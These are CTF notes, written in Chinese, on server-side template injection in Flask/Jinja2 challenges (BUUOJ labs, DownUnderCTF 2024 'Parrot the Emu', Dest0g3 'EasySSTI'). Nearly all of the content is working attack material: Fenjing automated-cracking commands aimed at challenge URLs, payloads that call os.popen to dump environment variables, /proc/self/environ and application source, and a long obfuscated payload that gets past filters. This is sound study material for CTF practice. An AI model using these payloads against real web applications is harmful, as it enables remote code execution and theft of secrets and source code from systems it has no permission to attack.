# 先考虑Fenjing一把梭

## [Flask]SSTI

```
python -m fenjing crack --method GET --inputs name --url 'http://node5.buuoj.cn:28083'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('env').read()}}
```

![image-20240716010107060](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716010107060.png)



## [第三章 web进阶]SSTI

```
python -m fenjing crack --method GET --inputs password --url 'http://b7823c99-0f4a-4a3f-946f-c01c52459482.node5.buuoj.cn:81/'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('cat /app/server.py').read()}}
```

![image-20240716011159944](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716011159944.png)

```
{{''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /proc/self/environ").read()')}}
```

```
{{''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /app/server.py").read()')}}
```



## DownUnderCTF 2024 [web] Parrot the Emu

[DownUnderCTF 2024 | Cook1e (p-pratik.github.io)](https://p-pratik.github.io/posts/ductf'24/)

[Server Side Template Injection (SSTI) In Flask/Jinja2 (payatu.com)](https://payatu.com/blog/server-side-template-injectionssti/)

在环境变量env中找到flag

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
```

fenjing得到的payload：

```
python -m fenjing crack --method POST --inputs user_input --url 'https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

![image-20240716005756767](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716005756767.png)

## EasySSTI

[【Web】Dest0g3 520迎新赛 题解(全)_[dest0g3 520迎新赛\]pharpop-CSDN博客](https://blog.csdn.net/uuzeray/article/details/137777759)

```
{%set%0aid=dict(ind=a,ex=a)|join%}{%set%0app=dict(po=a,p=a)|join%}{%set%0ann=dict(n=a)|join%}{%set%0aenv=dict(env=a)|join%}{%set%0appe=dict(po=a,pen=a)|join%}{%set%0att=dict(t=a)|join%}{%set%0agt=dict(ge=a,t=a)|join%}{%set%0aff=dict(f=a)|join%}{%set%0aooqq=dict(o=a,s=a)|join%}{%set%0afive=(lipsum|string|list)|attr(id)(tt)%}{%set%0ard=dict(re=a,ad=a)|join%}{%set%0athree=(lipsum|string|list)|attr(id)(nn)%}{%set%0aone=(lipsum|string|list)|attr(id)(ff)%}{%set%0ashiba=five*five-three-three-one%}{%set%0axiahuaxian=(lipsum|string|list)|attr(pp)(shiba)%}{%set%0agb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0abin=(xiahuaxian,xiahuaxian,dict(built=a,ins=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0aini=(xiahuaxian,xiahuaxian,dict(in=a,it=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0achcr=(lipsum|attr(gb))|attr(gt)(bin)%}{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(env)|attr(rd)()}}
```

![image-20240716004841315](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716004841315.png)
